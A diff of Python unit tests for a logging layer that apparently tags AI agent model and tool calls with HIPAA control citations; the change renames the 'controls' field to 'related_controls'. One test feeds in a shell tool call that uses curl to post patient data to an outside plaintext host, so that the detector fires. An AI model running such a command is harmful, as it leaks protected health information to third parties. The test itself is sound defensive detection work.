@@ -57,15 +57,15 @@ class ControlTagTests(unittest.TestCase):
     def test_ambient_tags_every_record_of_kind(self):
         core.log_model_call(1, "hello there", "hi")  # benign, no PHI
         mc = next(r for r in self._records() if r["kind"] == "model_call")
-        self.assertEqual(mc.get("controls"), ["164.312(b)"])
+        self.assertEqual(mc.get("related_controls"), ["164.312(b)"])
         self.assertEqual(core._counts["flagged"], 0)
 
     def test_matcher_tags_flags_and_stores_on_hit(self):
         core.log_model_call(2, "summarize the patient chart", "the diagnosis is X")
         mc = next(r for r in self._records() if r["kind"] == "model_call")
         # carries both the ambient tag and the triggered control
-        self.assertIn("164.312(b)", mc["controls"])
-        self.assertIn("164.502(b)", mc["controls"])
+        self.assertIn("164.312(b)", mc["related_controls"])
+        self.assertIn("164.502(b)", mc["related_controls"])
         # a flag matcher forces content storage and bumps the flag count
         self.assertIn("content", mc)
         self.assertEqual(core._counts["flagged"], 1)
@@ -73,7 +73,7 @@ class ControlTagTests(unittest.TestCase):
     def test_no_match_no_triggered_tag(self):
         core.log_model_call(3, "what is the weather", "sunny")
         mc = next(r for r in self._records() if r["kind"] == "model_call")
-        self.assertNotIn("164.502(b)", mc.get("controls", []))
+        self.assertNotIn("164.502(b)", mc.get("related_controls", []))
         self.assertEqual(core._counts["flagged"], 0)
 
     def test_matcher_sees_content_before_redaction(self):
@@ -81,22 +81,22 @@ class ControlTagTests(unittest.TestCase):
         core.REDACT_MODE = "on"
         core.log_tool_call("run_shell", "echo patient record", "ALLOW", "ok", result="done")
         tc = next(r for r in self._records() if r["kind"] == "tool_call")
-        self.assertIn("164.502(b)", tc.get("controls", []))
+        self.assertIn("164.502(b)", tc.get("related_controls", []))
 
     def test_and_matcher_needs_both_groups(self):
         # PHI context alone -> does NOT fire the AND transmission matcher
         core.log_model_call(5, "the patient is stable", "ok")
         mc = next(r for r in self._records() if r.get("step") == 5)
-        self.assertNotIn("164.312(e)", mc.get("controls", []))
+        self.assertNotIn("164.312(e)", mc.get("related_controls", []))
         # PHI context AND a plaintext endpoint -> fires
         core.log_tool_call("run_shell", "curl http://x.io -d patient", "ALLOW", "ok", result="")
         tc = next(r for r in self._records() if r["kind"] == "tool_call")
-        self.assertIn("164.312(e)", tc.get("controls", []))
+        self.assertIn("164.312(e)", tc.get("related_controls", []))
 
     def test_untagged_kind_has_no_controls_field(self):
         core.log_tool_call("run_shell", "ls", "ALLOW", "ok", result="x")  # no ambient, no match
         tc = next(r for r in self._records() if r["kind"] == "tool_call")
-        self.assertNotIn("controls", tc)
+        self.assertNotIn("related_controls", tc)
 
     def test_tagged_chain_still_verifies(self):
         core.log_model_call(4, "patient intake", "ok")
